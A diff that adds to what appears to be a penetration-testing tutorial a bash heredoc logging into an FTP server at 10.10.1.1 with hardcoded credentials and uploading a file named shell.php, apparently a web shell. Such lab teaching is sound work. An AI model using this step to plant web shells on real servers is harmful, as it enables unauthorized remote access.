@@ -104,3 +104,13 @@ Connected to 10.10.1.1
 Uploading a file is very simple. In this example, I want to upload a file named shell.php. After I log into the system and navigate to the appropriate directory on the FTP server, I run the following command:
 
 `put shell.php`
+
+Another approach is using the EOF (end of file) markers:
+
+```bash
+ftp -n <<EOF
+open 10.10.1.1
+user jenny letmein1
+put shell.php
+EOF
+```
